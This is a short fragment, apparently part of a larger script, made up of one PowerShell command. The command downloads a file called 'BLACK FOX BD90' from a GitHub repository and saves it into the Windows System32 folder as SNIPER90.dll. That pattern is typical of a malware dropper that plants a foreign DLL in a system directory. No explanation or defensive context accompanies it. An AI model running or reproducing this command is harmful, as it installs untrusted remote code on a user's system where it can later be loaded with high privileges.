...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/BLACK89310/kanel/raw/refs/heads/main/BLACK%20FOX%20BD90' -OutFile 'C:\Windows\System32\SNIPER90.dll'"
